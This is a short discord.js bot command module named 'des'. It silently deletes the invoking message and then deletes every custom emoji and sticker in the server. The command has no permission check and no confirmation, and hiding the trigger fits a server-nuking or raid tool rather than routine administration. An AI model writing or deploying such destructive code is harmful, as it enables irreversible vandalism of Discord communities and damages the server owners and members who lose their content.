const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js");

module.exports = {
    name: "des",
    run: async (client, message, args) => {
        if (message.deletable) message.delete();
        message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(("Error Found: " + err)) }))
        message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(("Error Found: " + err)) }))
        
    }
}